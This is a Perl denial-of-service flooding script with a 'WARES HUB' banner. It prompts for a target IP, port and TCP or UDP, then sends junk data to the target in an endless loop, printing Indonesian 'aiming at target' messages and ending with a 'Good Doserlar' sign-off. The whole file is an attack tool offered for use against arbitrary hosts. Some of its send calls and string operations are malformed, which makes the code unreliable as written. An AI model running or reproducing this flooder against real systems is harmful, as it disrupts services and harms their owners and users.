#!/usr/bin/perl

use IO::Socket;
use Scalar::Util qw(looks_like_number);

#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
print q{ 

██╗    ██╗ █████╗ ██████╗ ███████╗███████╗    ██╗  ██╗██╗   ██╗██████╗ 
██║    ██║██╔══██╗██╔══██╗██╔════╝██╔════╝    ██║  ██║██║   ██║██╔══██╗
██║ █╗ ██║███████║██████╔╝█████╗  ███████╗    ███████║██║   ██║██████╔╝
██║███╗██║██╔══██║██╔══██╗██╔══╝  ╚════██║    ██╔══██║██║   ██║██╔══██╗
╚███╔███╔╝██║  ██║██║  ██║███████╗███████║    ██║  ██║╚██████╔╝██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                                                                       

};
# Check Intenret Connection !
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] Internet Status[ Not Connected ]");
	print("\n[!] Error: Please Check Your Internet Connection !!!");
	exit(1);
}
$check->close();
# INPUT TARGET INFO ==============================================
print "\n━━━━━━━━━━━━━━━━━━━━┳";
print "\n[~] IP Target : "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n━━━━━━━━━━━━━━━━━━━━┳";
print "\n[~] Port : "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port";
print "\n━━━━━━━━━━━━━━━━━━━━┳";
print "\n[~] Protocol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n━━━━━━━━━━━━━━━━━━━━┳";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n### Sedang mengisi Amunisi ###\n";
sleep(5);
print "\n \n";
sleep(4);
print "\n### Sedang Membidik Target ###\n";
sleep(2);
print "\n ━ ━ ━━ ━  - - -- -  - – - – -=D \n";
sleep(1);
print "\n[*] Attack Start On ** 🅦 ** 🅔 ** 🅝 ** 🅓 ** 🅔 ** 🅥 ** [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()

#Made By Sqwares#1337
#Good Doserlar
#GoodBye
